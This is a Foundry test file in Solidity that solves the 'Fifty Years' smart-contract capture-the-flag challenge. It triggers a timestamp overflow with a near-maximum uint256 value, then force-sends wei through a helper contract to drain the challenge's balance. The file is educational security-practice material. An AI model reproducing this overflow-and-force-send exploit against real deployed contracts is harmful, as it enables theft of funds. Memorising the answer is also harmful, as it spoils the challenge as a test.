// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {ForceSend} from "../../src/math/helpers/ForceSend.sol";

interface IFiftyYearsChallenge {
    function isComplete() external view returns (bool);

    function upsert(uint256 index, uint256 timestamp) external payable;

    function withdraw(uint256 index) external;
}

contract TestFiftyYearsChallenge is Test {
    IFiftyYearsChallenge challenge;
    ForceSend attack;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    function setUp() external {
        vm.deal(deployer, 1 ether);
        vm.deal(player, 1 ether);

        vm.prank(deployer);
        address challengeAddress = deployCode(
            "FiftyYearsChallenge.sol:FiftyYearsChallenge",
            abi.encode(player),
            1 ether
        );

        challenge = IFiftyYearsChallenge(challengeAddress);
    }

    function test_Solution() external {
        vm.startPrank(player);

        challenge.upsert{value: 1 wei}(1, type(uint256).max - 1 days + 1);

        challenge.upsert{value: 2 wei}(2, 0);

        attack = new ForceSend{value: 2 wei}(address(challenge));

        challenge.withdraw(2);

        vm.stopPrank();

        assert(challenge.isComplete());
    }
}
